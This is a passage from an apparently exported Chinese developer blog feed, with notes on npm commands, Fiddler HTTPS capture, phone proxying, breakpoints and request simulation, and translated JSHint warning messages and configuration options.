repo命令则是打开一个模块的代码仓库。 12 $ npm home $package$ npm repo $package 这两个命令不需要模块先安装。 npm outdated npm outdated命令检查当前项目所依赖的模块，是否已经有新版本。 1 $ npm outdated 它会输出当前版本（current version）、应当安装的版本（wanted version）和最新发布的版本（latest version）。 npm prune npm prune检查当前项目的node_modules目录中，是否有package.json里面没有提到的模块，然后将所有这些模块输出在命令行。 1 $ npm prune npm shrinkwrap npm shrinkwrap的作用是锁定当前项目的依赖模块的版本。 1 $ npm shrinkwrap 运行该命令后，会在当前项目的根目录下生成一个npm-shrinkwrap.json文件，内容是node_modules目录下所有已经安装的模块，以及它们的精确版本。 下次运行npm install命令时，npm发现当前目录下有npm-shrinkwrap.json文件，就会只安装里面提到的模块，且版本也会保持一致。 上文原文地址 上文原文地址：http://javascript.ruanyifeng.com/nodejs/npm.html#toc19 第三方npm cnpm 国产的npm管理，优点是速度快，缺点是定时更新导致更新有延迟 verdaccio github：https://github.com/verdaccio/verdaccio官网：https://www.verdaccio.org/ 相当于把npm内容下载到本地，同时也可以在本地发布 npm 下载量统计 https://npm-stat.com/api/download-counts?package=miniprogram-keyboard-num&amp;from=2018-01-01&amp;until=2019-12-31 该接口查看一段时间内每天的下载量，可以自己根据需要做统计]]></content>
      <categories>
        <category>Npm</category>
      </categories>
      <tags>
        <tag>Npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler抓包https]]></title>
    <url>%2Fblob%2F2017-08-24-fiddler-grab-pack-https%2F</url>
    <content type="text"><![CDATA[原文1原文2 原理 fiddler抓包原理 fiddler 调试器注册到操作系统因特网服务中，系统所有的网络请求都会走fiddler的代理，所以fiddler才能抓包。 Debug traffic from any client and browserFiddler helps you debug traffic from any browser: Internet Explorer, Chrome, Firefox, Safari, Opera, and more. Once you start Fiddler, the web debugger registers itself as the system proxy for Microsoft Windows Internet Services (WinINet), the HTTP layer used by Internet Explorer, Microsoft Office, and many other products. As the system proxy, all HTTP requests from WinINet flow through Fiddler before reaching the target web servers. Similarly, all HTTP responses flow through Fiddler before being returned to the client application.Additionally, most devices that support Wi-Fi or Ethernet can be configured to send their traffic to Fiddler; this includes iOS, Android, Windows Phone and Windows RT devices. fiddler解密https原理 其实fiddler就是中间人攻击，依次经过如下过程 fiddler接到客户端的https请求，fiddler将请求转发给服务器 服务器生成公钥证书，返回给fiddler；fiddler拦截下真的公钥证书，并生成伪造的公钥证书给客户端； 客户端使用伪造的公钥证书加密共享密钥发送给fiddler，fiddler使用伪造的私钥解密获取共享密钥 fiddler将解密后的共享密钥，使用真正的公钥加密发送给服务器端，服务器使用共享密钥与fiddler通信 fiddler使用共享密钥与客户端通信以上是fiddler抓包解密的原理，这个原理是建立在https建立连接的基础上的，请参考https建立连接过程 开始抓包 设置fiddler抓包 File—–&gt;capture traffic 设置抓https和解密https Tools—–&gt;fiddler options—–&gt;https—–&gt;capture https traffic—-&gt;decrypt https traffic—&gt;Ignore server certificate errors—-&gt;Actions—–&gt;Trust root certificate—-&gt;之后都是确定 安装根证书后，可以点击Actions—–&gt;open windows certificate manager查看安装到系统的根证书 根证书的作用：fiddler对每个域名都会生成公钥证书，浏览器会用根证书验证公钥证书的合法性，所以，根证书是https 抓包必不可少的部分效果我们那支付宝登陆界面做测试，支付宝登陆页面 常见问题 http tunnel、http connect 有一种情况，host都是tunnel to， url 后边都带着443，这是什么意思呢？ 查看，请求头会发现使用了Connect方法，Connect方法通常会建议代理(fiddler)与目标服务器建立http tunnel；尽管Connect也可以用于http，但是一般是用于SSL通信； CONNECT www.google.com:443 这句话表示，代理与服务器的443端口建立了http tunnel，在此之后，所有由客户端发送的内容，都会经由http 代理，转发给www.google.com:443端口；更多http tunnel&amp;http connect资料可以参考http tunnel&amp;connect 解密失败 有的时候，发现解密失败，这是可以查看connect的log。如图 通过查看响应，我们看到，是由于没有设置解密导致的，This is a CONNECT tunnel, through which encrypted HTTPS traffic flows.Fiddler’s HTTPS Decryption feature is enabled, but this specific tunnel was configured not to be decrypted. Settings can be found inside Tools &gt; Fiddler Options &gt; HTTPS.A SSLv3-compatible ServerHello handshake was found. Fiddler extracted the parameters below.Tools &gt; Fiddler Options &gt; HTTPS，选中解密https，选择正确的来源，解密成功。 当然，如果不想显示Connect，你也可以设置rules-----&gt;hide connects 隐藏connect；如果还是解密失败，可以查看Log标签页，错误信息都会在这里边显示。 抓不到手机微信 有网友跟我说，抓不到手机微信的数据，这是因为，微信走的http2协议，fiddler不支持http2协议，所以用wireshark抓，但http2也是加密的，所以抓到的数据看不懂。]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler手机抓包]]></title>
    <url>%2Fblob%2F2017-08-24-fiddler-handset-grab-bag%2F</url>
    <content type="text"><![CDATA[启动Fiddler，打开菜单栏中的 Tools &gt; Fiddler Options，打开“Fiddler Options”对话框。 在Fiddler Options”对话框切换到“Connections”选项卡，然后勾选“Allow romote computers to connect”后面的复选框，然后点击“OK”按钮。 打开android设备的“设置”-&gt;“WLAN”，找到你要连接的网络，在上面长按，然后选择“修改网络”，弹出网络设置对话框，然后勾选“显示高级选项” 在“代理”后面的输入框选择“手动”，在“代理服务器主机名”后面的输入框输入电脑的ip地址，在“代理服务器端口”后面的输入框输入8888，然后点击“保存”按钮。]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler断点]]></title>
    <url>%2Fblob%2F2017-05-24-fiddler-breakpoint%2F</url>
    <content type="text"><![CDATA[Fiddler中设置断点修改Request 第一种：打开Fiddler 点击Rules-&gt; Automatic Breakpoint -&gt;Before Requests(这种方法会中断所有的会话)如何消除命令呢？ 点击Rules-&gt; Automatic Breakpoint -&gt;Disabled 第二种: 在命令行中输入命令: bpu www.baidu.com (这种方法只会中断www.baidu.com)如何消除命令呢？ 在命令行中输入命令 bpu Fiddler 能中断这次会话，选择被中断的会话，点击Inspectors tab下的WebForms tab 修改用户名密码，然后点击Run to Completion 如下图所示。 Fiddler中设置断点修改Response 第一种：打开Fiddler 点击Rules-&gt; Automatic Breakpoint -&gt;After Response (这种方法会中断所有的会话)如何消除命令呢？ 点击Rules-&gt; Automatic Breakpoint -&gt;Disabled 第二种: 在命令行中输入命令: bpuafter www.baidu.com (这种方法只会中断www.baidu.com)如何消除命令呢？ 在命令行中输入命令 bpuafter,]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler模拟POST或Get请求]]></title>
    <url>%2Fblob%2F2017-05-24-fiddler-simulates-post-or-get-requests%2F</url>
    <content type="text"><![CDATA[打开我们Fiddler2程序，开始咯(这个刚好英文版的，可以去下载汉化包) 这个要根据图片来，图中标记需要分别介绍下图标记1: 这个是请求状态和结果的显示区域图标记2: 请求的方法选择，常用的就是POST请求和GET请求方式图标记3: 请求的地址输入框图标记4: 我们提交的数据输入框图标记5: 这个是我们请求的数据头输入框图标记6: 点击这个Execute按钮，就可以提交我们的模拟请求 首先使用Fiddler2模拟GET请求1.在地址输入框里面模拟的GET请求地址(已被遮罩了，你们懂得)2.选择请求的方法，这里我们选择GET方法3.点击Execute按钮，就可以执行模拟请求4.在显示区域就可以看到我们刚刚提交的请求5.直接双击显示区域里面的请求记录，就可以看到我们的GET方法的数据 然后使用Fiddler2模拟POST请求1.在地址输入框里面模拟的POST请求地址(已被遮罩了，你们懂得)2.选择请求的方法，这里我们选择POST方法3.在提交的数据输入框里面输入我们提交的POST数据3.点击Execute按钮，就可以执行模拟请求4.在显示区域就可以看到我们刚刚提交的请求5.直接双击显示区域里面的请求记录，就可以看到我们的POST方法的数据]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime lint-JSHint MSG]]></title>
    <url>%2Fblob%2F2017-03-15-ide-sublime-lint-jshint-msg%2F</url>
    <content type="text"><![CDATA[“Missing semicolon.” : “缺少分号.”,“Use the function form of \”use strict\”.” : “使用标准化定义function.”,“Unexpected space after ‘-’.” : “在’-‘后面不应出现空格.”,“Expected a JSON value.” : “请传入一个json的值.”,“Mixed spaces and tabs.”: “空格和TAB重复.”,“Unsafe character.” : “不安全的字符.”,“Line too long.”: “本行中的字符超过设定的最大长度.”,“Trailing whitespace.”: “本行末尾有过多无用空格.”,“Script URL.” : “脚本URL.”,“Unexpected {a} in ‘{b}’.” : “在 ‘{b}’ 中不该出现 {a}.”,“Unexpected ‘{a}’.” : “不该在此出现’{a}’.”,“Strings must use doublequote.” : “字符串需要用双引号”,“Unnecessary escapement.” : “不需要转义”,“Control character in string: {a}.” : “在字符串中出现了Control的字符”,“Avoid \’.” : “避免 \”,“Avoid \v.” : “避免 \v”,“Avoid \x-.” : “避免 \x-”,“Bad escapement.” : “错误的转义字符”,“Bad number ‘{a}’.” : “错误的数字 ‘{a}’”,“Missing space after ‘{a}’.” : “在’{a}’之后缺少空格”,“Don’t use extra leading zeros ‘{a}’.” : “不要再’{a}’的前面用多余的0″,“Avoid 0x-. ‘{a}’.” : “避免使用 0x-. ‘{a}’.”,“A trailing decimal point can be confused with a dot ‘{a}’.” : “在’{a}’中使用点尾随小数点”,“Unexpected comment.” : “不该在此处出现注释”,“Unescaped ‘{a}’.” : “没有转义 ‘{a}’”,“Unexpected control character in regular expression.” : “在正则表达式中出现了control字符”,“Unexpected escaped character ‘{a}’ in regular expression.” : “在正则表达式中出现了没有转义的字符 ‘{a}’”,“Expected ‘{a}’ and instead saw ‘{b}’.” : “应该用 ‘{a}’代替’{b}’”,“Spaces are hard to count. Use .” : “空格难以统计，请使用 ”,“Insecure ‘{a}’.” : “不安全的 ‘{a}’”,“Empty class.” : “空的class”,“Expected a number and instead saw ‘{a}’.”:“应该用数字代替’{a}’”,“‘{a}’ should not be greater than ‘{b}’.”:“‘{a}’不应该比’{b}’大”,“‘hasOwnProperty’ is a really bad name.”: “‘hasOwnProperty’是关键字”,“‘{a}’ was used before it was defined.”:“‘{a}’未定义就已经使用了.”,“‘{a}’ is already defined.”:“‘{a}’被重复定义”,“A dot following a number can be confused with a decimal point.”:“数字后面的一个点会被误认为是十进制的小数点”,“Confusing minusses” : “容易混淆的负数表达-”,“Confusing plusses.” : “容易混淆的正数表达+”,“Unmatched ‘{a}’.” : “无法匹配的’{a}’”,“Expected ‘{a}’ to match ‘{b}’ from line {c} and instead saw ‘{d}’.”:“在行{c}中需要用’{a}’和’{b}’匹配，用来代替’{d}’”,“Unexpected early end of program.”:“程序不可预期的提前终止”,“A leading decimal point can be confused with a dot: ‘.{a}’.”:“‘{a}’前的点容易混淆成小数点”,“Use the array literal notation [].”:“使用数组的符号 []“,“Expected an operator and instead saw ‘{a}’.”:“需要用一个符号来代替’{a}’”,“Unexpected space after ‘{a}’.”:“在’{a}’之后不能出现空格”,“Unexpected space before ‘{a}’.”:“在’{a}’之前不能出现空格”,“Bad line breaking before ‘{a}’.”:“在’{a}’之前错误的换行”,“Expected ‘{a}’ to have an indentation at {b} instead at {c}.”:“‘{a}’需要在{c}而不是{b}处缩进”,“Line breaking error ‘{a}’.”:“换行错误 ‘{a}’”,“Unexpected use of ‘{a}’.”:“此处不能用’{a}’”,“Bad operand.”:“错误的操作数”,“Use the isNaN function to compare with NaN.”:“使用isNaN来与NaN比较”,“Confusing use of ‘{a}’.”:“容易混淆的’{a}’的使用”,“Read only.”:“只读的属性”,“‘{a}’ is a function.”:“‘{a}’是一个函数”,‘Bad assignment.’:“错误的赋值”,“Do not assign to the exception parameter.”:“不要给额外的参数赋值”,“Expected an identifier in an assignment and instead saw a function invocation.”:“在赋值的语句中需要有一个标识符，而不是一个方法的调用”,“Expected an identifier and instead saw ‘{a}’ (a reserved word).”:“需要有一个标识符，而不是’{a}’(保留字符)”,“Missing name in function declaration.”:“在方法声明中缺少名称”,“Expected an identifier and instead saw ‘{a}’.”:“需要有一个标识符，而不是’{a}’”,“Inner functions should be listed at the top of the outer function.”:“内部函数的声明应该放在此函数的顶部。”,“Unreachable ‘{a}’ after ‘{b}’.”:“在’{b}’之后无法获取’{a}’”,“Unnecessary semicolon.”:“不必要的分号”,“Label ‘{a}’ on {b} statement.”:“将’{a}’放在{b}的声明中”,“Label ‘{a}’ looks like a javascript url.”:“‘{a}’看上去像一个js的链接”,“Expected an assignment or function call and instead saw an expression”:“需要一个赋值或者一个函数调用，而不是一个表达式.”,“Do not use ‘new’ for side effects.”:“不要用’new’语句.”,“Unnecessary \”use strict\”.”:“不必要的\”use strict\”.”,“Missing \”use strict\” statement.”:“缺少\”use strict\”的声明”,“Empty block.”:“空的模块”,“Unexpected /member ‘{a}’.”:“不应出现 /元素 ‘{a}’.”,“‘{a}’ is a statement label.”:“‘{a}’是一个声明”,“‘{a}’ used out of scope.”:“‘{a}’使用超出范围”,“‘{a}’ is not allowed.”:“不允许使用’{a}’”,“‘{a}’ is not defined.”:“‘{a}’没有被定义”,“Use ‘{a}’ to compare with ‘{b}’.”:“使用’{a}’与’{b}’相比”,“Variables should not be deleted.”:“变量需要被删除”,“Use the object literal notation {}.”:“使用对象的文字符号 {}”,“Do not use {a} as a constructor.”:“不要使用{a}作为一个构造对象”,“The Function constructor is eval.”:“The Function constructor is eval.”,“A constructor name should start with an uppercase letter.”:“一个构造对象的名称必须用大写字母开头.”,“Bad constructor.”:“错误的构造对象”,“Weird construction. Delete ‘new’.”:“构造对象有误，请删除’new’”,“Missing ‘()’ invoking a constructor.”:“缺少括号()”,“Avoid arguments.{a}.”:“避免参数.{a}.”,“document.write can be a form of eval.”:“document.write是eval的一种形式”,‘eval is evil.’:“尽量不要使用eval”,“Math is not a function.”:“Math不是一个函数”,“Missing ‘new’ prefix when invoking a constructor.”:“此处缺少了’new’”,“Missing radix parameter.”:“缺少参数”,“Implied eval is evil. Pass a function instead of a string.”:“传递一个函数，而不是一个字符串”,“Bad invocation.”:“错误的调用”,“[‘{a}’] is better written in dot notation.”:“[‘{a}’]最好用点.的方式”,“Extra comma.”:“多余的逗号”,“Don’t make functions within a loop.”:“不要用循环的方式创建函数”,“Unexpected parameter ‘{a}’ in get {b} function.”:“在{b}方法中不该用到参数’{a}’”,“Duplicate member ‘{a}’.”:“重复的’{a}’”,“Expected to see a statement and instead saw a block.”:“此处应该是语句声明.”,“Too many var statements.”:“过多var的声明”,“Redefinition of ‘{a}’.”:“‘{a}’被重复定义”,“It is not necessary to initialize ‘{a}’ to ‘undefined’.”:“无需将’{a}’初始化为’undefined’”,“Expected a conditional expression and instead saw an assignment.”:“此处需要一个表达式，而不是赋值语句”,“Expected a ‘break’ statement before ‘case’.”:“在’case’之前需要有’break’.”,“Expected a ‘break’ statement before ‘default’.”:“在’default’之前需要有’break’.”,“This ‘switch’ should be an ‘if’.”:“此处’switch’应该是’if’.”,“All ‘debugger’ statements should be removed.”:“请删除’debugger’的语句”,“‘{a}’ is not a statement label.”:“‘{a}’不是一个声明标签.”,“Function declarations should not be placed in blocks. Use a function expression or move the statement to the top of the outer function.”:“函数的声明不能放在类似if的块中，需要放在外部函数的顶部.”]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime lint-JSHint 配置选项]]></title>
    <url>%2Fblob%2F2017-03-13-ide-sublime-lint-jshint-configuration-options%2F</url>
    <content type="text"><![CDATA[JSHint选项此页面的内容源自JSHint项目存储库。如果您发现错误，请打开一个问题或（更好的）提出拉请求！ 来自官方文档 http://jshint.com/docs/options/#enforceall google翻译 强制执行选项 当设置为true时，这些选项将使JSHint产生更多关于您的代码的警告。 bitwise 此选项禁止使用按位运算符，例如^（XOR）， |（OR）和其他。位运算符在JavaScript程序中非常罕见，而且往往&amp;只是一个错误类型&amp;&amp;。 camelcase 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项允许强制所有变量名称使用camelCase样式或带下划线的UPPER_CASE。 curly 此选项要求您始终在循环和条件中的块周围放置花括号。当块仅包含一个语句时，JavaScript允许您省略花括号，例如：while (day) shuffle();然而，在某些情况下，它可能导致错误（你会认为这 sleep()是循环的一部分，而实际上它不是）：while (day) shuffle(); sleep(); enforceall 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 如果不自动选择让用户使用新功能，则无法维护该选项。这可能会导致在次要版本的JSHint之间升级时出现意外的警告/错误。此选项是JSHint版本2.6.3中提供的最严格的JSHint配置的简写。它启用所有强制执行选项并禁用在该版本中定义的所有轻松选项。 eqeqeq 此选项禁止使用==和!=支持===和 !==。前者在比较之前尝试强制值，这可能导致一些意想不到的结果。后者不做任何强制，所以他们一般更安全。如果你想更多地了解JavaScript中的类型强制，我们推荐 Angus Croll的真理，平等和JavaScript。 es3 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 请esversion: 3改用。这个选项告诉JSHint你的代码需要遵守ECMAScript 3规范。如果您需要您的程序在旧版浏览器（如Internet Explorer 6/7/8/9）和其他旧版JavaScript环境中可执行，请使用此选项。 es5 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 请esversion: 5改用。此选项启用首先在ECMAScript 5.1规范中定义的语法。这包括允许保留关键字作为对象属性。 esversion 此选项用于指定代码必须遵守的ECMAScript版本。它可以采用以下值之一：3 - 如果您需要您的程序在旧版浏览器（如Internet Explorer 6/7/8/9）和其他旧版JavaScript环境中可执行5- 启用首先在ECMAScript 5.1规范中定义的语法。这包括允许保留关键字作为对象属性。6- 告诉JSHint你的代码使用ECMAScript 6的特定语法。请注意，并非所有浏览器都实现它们。 forin 此选项需要所有for in循环过滤对象的项目。for语句允许循环遍历对象的所有属性的名称，包括通过原型链继承的那些属性的名称。此行为可能导致对象中的意外项目，因此通常更安全地筛选继承属性，如示例所示：for (key in obj) { if (obj.hasOwnProperty(key)) { // We are sure that obj[key] belongs to the object and was not inherited. }}要更深入地了解JavaScript中的for in循环，请 参阅 Angus Croll 探索JavaScript for-in循环。 freeze 这个选项禁止重写本地对象如原型 Array，Date等等。// jshint freeze:trueArray.prototype.count = function (value) { return 4; };// -&gt; Warning: Extending prototype of native object: ‘Array’. funcscope 此选项抑制关于在控制结构内声明变量的警告，同时从外部访问它们。即使JavaScript只有两个真实范围 - 全局和函数 - 这样的实践导致新的语言和难以调试的bug的人之间的混乱。这就是为什么，默认情况下，JSHint警告在预期范围之外使用的变量。function test() { if (true) { var x = 0; } x += 1; // Default: ‘x’ used out of scope. // No warning when funcscope:true} futurehostile 此选项启用有关使用在未来版本的JavaScript中定义的标识符的警告。虽然覆盖它们在没有实现的上下文中没有效果，但是当将代码库迁移到该语言的较新版本时，这种做法会引起问题。 globals 此选项可用于指定未在源代码中正式定义的全局变量的白名单。当与undef选项组合时，这是最有用的，以便抑制特定于项目的全局变量的警告。设置条目以true启用读取和写入该变量。将其设置为false将触发JSHint将该变量视为只读。另请参见“环境”选项：一组选项，用于启用在常见JavaScript环境中定义的全局变量。要globals在单个文件中配置，请参阅内联配置。 immed 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项禁止使用立即函数调用，而不将其包含在括号中。括号括号帮助您的代码的读者理解表达式是函数的结果，而不是函数本身。 indent 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项为代码设置特定的制表符宽度。 iterator 此选项禁止有关iterator属性的警告。此属性不受所有浏览器支持，因此请仔细使用它。 latedef 此选项禁止在定义变量之前使用变量。JavaScript只有函数范围，除此之外，所有的变量总是被移动或悬挂到函数的顶部。这种行为可以导致一些非常讨厌的错误，这就是为什么它是更安全的总是使用变量只有在它们被明确定义之后。将此选项设置为“nofunc”将允许忽略函数声明。为了更深入地了解JavaScript中的范围和提升，请阅读 Ben Cherry的JavaScript Scoping和Hoisting。 maxcomplexity 此选项允许您控制整个代码中的循环复杂性。环路复杂性测量通过程序源代码的线性独立路径的数量。阅读更多关于维基百科上的复杂性。 maxdepth 此选项允许您控制嵌套的嵌套方式：// jshint maxdepth:2function main(meaning) { var day = true; if (meaning === 42) { while (day) { shuffle(); if (tired) { // JSHint: Blocks are nested too deeply (3). sleep(); } } }} maxerr 此选项允许您设置JSHint将在放弃之前产生的最大警告量。默认值为50。 maxlen 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项允许您设置线的最大长度。 maxparams 此选项允许您设置每个函数允许的形式参数的最大数量：// jshint maxparams:3function login(request, onSuccess) { // …}// JSHint: Too many parameters per function (4).function logout(request, isManual, whereAmI, onSuccess) { // …} maxstatements 此选项允许您设置每个函数允许的最大语句数：// jshint maxstatements:4function main() { var i = 0; var j = 0; // Function declarations count as one statement. Their bodies // don’t get taken into account for the outer function. function inner() { var i2 = 1; var j2 = 1; return i2 + j2; } j = i + j; return j; // JSHint: Too many statements per function. (5)} newcap 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项需要大写构造函数的名称。与new操作符一起使用的大写函数只是一个约定，帮助程序员在视觉上区分构造函数和其他类型的函数，以帮助在使用时发现错误this。不这样做不会在任何浏览器或环境中破坏你的代码，但是通过阅读代码 - 如果函数应该使用或不使用新的，将更难一些。这很重要，因为当要使用的函数 new没有使用它时，this将指向全局对象而不是新对象。 noarg 此选项禁止使用arguments.caller和 arguments.callee。两者.caller并且.callee做了不少优化是不可能的，所以他们在JavaScript的未来版本中被弃用。事实上，ECMAScript 5禁止arguments.callee 在严格模式下使用。 nocomma 此选项禁止使用逗号运算符。当误用时，逗号运算符可能会掩盖语句的值，并促进错误的代码。 noempty 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项在代码中具有空块时发出警告。JSLint最初是对所有空块的警告，我们只是使其可选。没有研究报告，JavaScript中的空块以任何方式破坏您的代码。 nonbsp 此选项警告“不间断的空格”字符。这些字符可以在Mac计算机上与选项空间一起输入，并有可能中断非UTF8网页。 nonew 此选项禁止使用用于副作用的构造函数。有些人喜欢调用构造函数而不将其结果赋给任何变量：new MyConstructor();这种方法没有优势， MyConstructor因为操作符new创建的对象不在任何地方使用，所以你通常应该避免像这样的构造函数。 notypeof 此选项禁止有关无效typeof运算符值的警告。此运算符只有一组有限的可能返回值。默认情况下，JSHint警告，当您将其结果与一个无效值，通常可以是错字。// ‘fuction’ instead of ‘function’if (typeof a == “fuction”) { // Invalid typeof value ‘fuction’ // …}不要使用此选项，除非你绝对确定不需要这些检查。 predef 此选项允许您控制JSHint认为要在环境中隐式定义的变量。使用字符串值数组配置它。使用连字符（ - ）字符前缀变量名将从预定义变量的集合中删除该名称。JSHint将考虑以这种方式声明的变量是只读的。此选项不能在线指定; 它只能通过JavaScript API或外部配置文件使用。 quotmark 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项强制在您的代码中使用的引号的一致性。它接受三个值：true如果你不想强制一个特定的风格，但想要一些一致性，”single”如果你只想允许单引号，并且”double”如果你只想允许双引号。 shadow 此选项禁止关于变量阴影的警告，即声明已在外部作用域中某处声明的变量。“inner” - 检查在同一范围内定义的变量“outer” - 检查外部作用域中定义的变量false - 与inner相同true - 允许可变阴影 singleGroups 当不严格要求时，此选项禁止使用分组运算符。这种使用通常反映对一元操作符的误解，例如：// jshint singleGroups: truedelete(obj.attr); // Warning: Unnecessary grouping operator. strict 此选项要求代码在ECMAScript 5的strict模式下运行。 严格模式 是选择限制JavaScript版本的一种方式。严格模式消除了一些JavaScript错误，没有通过更改它们产生错误不会导致错误。它还修正了错误，使JavaScript引擎难以执行某些优化。“全球” - “use strict”;在全球层面必须有一个指令“隐含” - 将代码看作有”use strict”;指令false - 禁用关于严格模式的警告true - “use strict”;在函数级别必须有一个指令; this is preferable for scripts intended to be loaded in web browsers directly because enabling strict mode globally could adversely effect other scripts running on the same page undef 此选项禁止使用明确未声明的变量。此选项对于发现泄漏和错误的变量非常有用。// jshint undef:truefunction test() { var myVar = ‘Hello, World’; console.log(myvar); // Oops, typoed here. JSHint with undef will complain}如果你的变量在另一个文件中定义，你可以使用global 指令告诉JSHint它。 unused 此选项在定义和不使用变量时发出警告。这对于一般的代码清理非常有用，特别是在除了使用之外 undef。// jshint unused:truefunction test(a, b) { var c, d = 2; return a + d;}test(1, 2);// Line 3: ‘b’ was defined but never used.// Line 4: ‘c’ was defined but never used.除此之外，此选项将警告您通过该global伪指令声明的未使用的全局变量。这可以设置为vars仅检查变量，而不是函数参数，或strict检查所有变量和参数。默认（true）行为是允许未使用的参数，后跟一个使用的参数。 varstmt 当设置为true时，禁止使用VariableStatements。例如：// jshint varstmt: truevar a; // Warning: var declarations are forbidden. Use let or const instead. 放松的选择 当设置为true时，这些选项将使JSHint对您的代码产生较少的警告。 asi 此选项禁止有关缺少的分号的警告。有很多关于分号的FUD被社区中的很多人传播。常见的神话是，分号是一直需要的（他们不是），并且他们是不可靠的。JavaScript有关于分号的规则，所有浏览器都遵循这些规则，所以由您自己决定是否应该在代码中使用分号。有关JavaScript中的分号的更多信息，请参阅 Isaac Schlueter的分号和JavaScript分号插入对JavaScript领导人的公开信。 boss 此选项在预期进行比较的情况下禁止关于分配的使用的警告。通常情况下，代码if (a = 10) {}就是一个拼写错误。但是，它可以在这样的情况下有用：for (var i = 0, person; person = people[i]; i++) {}您可以通过使用括号包围该分配来按用途隐藏此错误，例如：for (var i = 0, person; (person = people[i]); i++) {} debug 此选项禁止对debugger代码中的语句的警告。elision 此选项告诉JSHint您的代码使用ES3数组elision元素，或空元素（例如，[1, , , 4, , , 7]）。 eqnull 此选项禁止有关== null比较的警告。当你想检查一个变量是null或是时，这种比较通常是有用的 undefined。 esnext 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 请esversion: 6改用。此选项告诉JSHint您的代码使用ECMAScript 6特定的语法。请注意，并非所有浏览器都实现这些功能。更多信息：ECMAScript 6规范 evil 此选项禁止有关使用的警告eval。使用是 eval不鼓励的，因为它可以使您的代码易受各种注入攻击，这使得JavaScript解释器很难做某些优化。 expr 此选项禁止有关使用通常希望看到赋值或函数调用的表达式的警告。大多数时候，这样的代码是拼写错误。但是，它不被规范禁止，这就是为什么这个警告是可选的。 globalstrict 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 使用strict: “global”。此选项禁止关于使用全局严格模式的警告。全局严格模式可以打破第三方小部件，因此不推荐使用。有关严格模式的详细信息，请参阅strict选项。 lastsemic 此选项禁止有关缺少的分号的警告，但仅在单行块中的最后一条语句省略分号时：var name = (function() { return ‘Anton’ }());这是一个非常小众的用例，只有当您使用自动JavaScript代码生成器时才有用。 laxbreak 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项抑制大多数有关代码中可能不安全的换行符的警告。它不抑制关于逗号优先编码风格的警告。要抑制那些你必须使用laxcomma（见下文）。 laxcomma 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项禁止关于逗号优先编码样式的警告：var obj = { name: ‘Anton’ , handle: ‘valueof’ , role: ‘SW Engineer’}; loopfunc 此选项禁止对循环中的函数的警告。定义循环中的函数可能会导致如下的错误：var nums = [];for (var i = 0; i &lt; 10; i++) { nums[i] = function (j) { return i + j; };}nums0; // Prints 12 instead of 2要修复上面的代码，你需要复制的值i：var nums = [];for (var i = 0; i &lt; 10; i++) { (function (i) { nums[i] = function (j) { return i + j; }; }(i));} moz 这个选项告诉JSHint你的代码使用Mozilla JavaScript扩展。除非您专门为Firefox Web浏览器开发，否则不需要此选项。更多信息：新的JavaScript 1.7 multistr 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项抑制有关多行字符串的警告。多行字符串在JavaScript中是很危险的，因为如果你不小心在转义字符（\）和一个新行之间放了一个空格，所有的地狱都会松动。请注意，即使此选项允许正确的多行字符串，它仍然警告多行字符串没有转义字符或转义字符和空格之间的任何东西。// jshint multistr:truevar text = “Hello\World”; // All good.text = “HelloWorld”; // Warning, no escape character.text = “Hello\World”; // Warning, there is a space after \ noyield 此选项抑制关于生成函数的警告，其中没有 yield语句。 plusplus 此选项禁止使用一元增量和减量运算符。有些人认为，++并–降低了他们的编码风格的质量，有编程语言，如Python，完全没有这些运算符。 proto 此选项禁止有关proto属性的警告。 scripturl 此选项会禁止关于使用以脚本为目标的网址的警告，例如javascript:…。 sub 警告此选项已被弃用，将在JSHint的下一个主要版本中删除。 JSHint将其范围限制为代码正确性的问题。如果你想强制执行有关代码风格的规则，请查看JSCS项目。此选项将禁止使用有关的警告[]符号时，它可以在点符号来表示：person[‘name’]对person.name。 supernew 此选项抑制关于“怪异”结构的警告，如 